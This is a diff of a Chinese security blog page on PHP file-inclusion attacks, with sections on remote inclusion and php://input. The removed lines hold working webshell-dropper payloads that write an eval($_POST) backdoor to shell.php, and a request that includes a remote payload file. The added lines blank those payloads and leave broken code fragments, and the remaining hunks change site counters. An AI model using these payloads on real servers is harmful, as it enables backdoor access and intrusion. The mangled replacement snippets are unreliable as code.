@@ -390,11 +390,11 @@
 <h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>需要All_url_fopen=On(默认开启)和Allow_url_include=On(默认关闭)</p>
 <h2 id="直接包含远程一句话"><a href="#直接包含远程一句话" class="headerlink" title="直接包含远程一句话"></a>直接包含远程一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include.php?file=http://127.0.0.2/a.txt</span><br></pre></td></tr></table></figure>
 <p>a.txt:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php @eval($_POST[xxx]); ?&gt;"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                         <span class="meta">?&gt;</span><span class="string">") ?&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><code>php://input</code>可以将post部分请求作为一个php的只读文件流</p>
 <p><img src="/php-文件包含利用/1549596283877.png" alt="1549596283877"></p>
 <p>生成一句话payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval($_POST['xxxser']);?&gt;"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                            <span class="meta">?&gt;</span><span class="string">") ?&gt;</span></span><br></pre></td></tr></table></figure>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
 <li>PHP文件包含漏洞，<a href="https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html" target="_blank" rel="noopener">https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html</a></li>
 <li>文件包含漏洞，<a href="https://www.cnblogs.com/bmjoker/p/9035259.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9035259.html</a></li>
@@ -523,7 +523,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -536,7 +536,7 @@
             <a href="/categories/">
           
         
-        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-count">28</span>
         <span class="site-state-item-name">分类</span>
         </a>
       </div>
@@ -549,7 +549,7 @@
             <a href="/tags/">
           
         
-        <span class="site-state-item-count">67</span>
+        <span class="site-state-item-count">68</span>
         <span class="site-state-item-name">标签</span>
         </a>
       </div>
